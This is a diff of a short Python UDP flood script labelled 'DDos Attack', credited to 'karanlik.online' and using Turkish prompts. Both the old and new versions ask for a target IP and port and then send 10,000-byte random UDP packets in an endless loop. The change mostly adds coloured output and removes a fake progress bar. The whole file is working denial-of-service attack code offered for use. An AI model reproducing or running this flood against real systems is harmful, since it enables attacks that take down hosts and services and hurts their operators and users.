@@ -1,54 +1,25 @@
-import sys
-import os
-import time
 import socket
 import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
+import os
+import colorama
+from colorama import Fore, Back, Style, init
 os.system("clear")
-os.system("figlet DDos Attack")
 banner="""
-###############################
-# Code by karanlik.online     #
-#                             #
-# Salvadores Team V1          #
-#                             #
-###############################
-İnstgram.com/karanlik.online
-
+##################################
+#GOTUNE GİRSİN HAWK              #
+#Code by karanlık.online         #
+##################################
 """
-print(banner)
+print(Fore.GREEN + banner)
 
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+hedef_ip=raw_input(Fore.RED + "hedef ip: ")
+hedef_port=input(Fore.RED + "hedef port: ")
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print("[                    ] 0% ")
-time.sleep(5)
-print("[=====               ] 25%")
-time.sleep(5)
-print("[==========          ] 50%")
-time.sleep(5)
-print("[===============     ] 75%")
-time.sleep(5)
-print("[====================] 100%")
-time.sleep(3)
-sent = 0
+bytes=random._urandom(10000)
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+sayac=0
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print("Saldırı %s Başlatıldı %s Gönderilen Paket:%s"%(sent,ip,port)
+    sock.sendto(bytes,(hedef_ip,hedef_port))
+    sayac=sayac+1
+    print(Fore.GREEN  + "saldiri baslatildi,gonderilen paket:%s"%(sayac))
